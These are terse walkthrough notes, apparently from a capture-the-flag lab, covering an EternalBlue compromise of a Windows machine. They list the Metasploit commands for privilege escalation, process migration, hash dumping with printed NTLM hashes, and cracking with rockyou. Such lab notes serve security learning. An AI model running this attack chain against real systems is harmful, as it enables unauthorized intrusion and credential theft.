+ Exploited eternalblue
+ Converted to meterpreter using shell_to_meterpreter in post module
+ `getsystem` -> switch to `shell` -> confirm `whoami` NT AUTHORITY\system
+ Run `ps` -> 3064  692   TrustedInstaller.exe | C:\Windows\servicing\TrustedInstaller.exe
+ Run `migrate 3064` 
+ Run `hashdump`
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+ Use inbuilt modules at post/windows/gather/hashdump to store in metsploit db
+ Crack hashes using auxiliary/analyze/crack_windows
+ John the ripper struggled, but the password was from rockyou.txt
+ Print text file on std output using `type filename.txt`

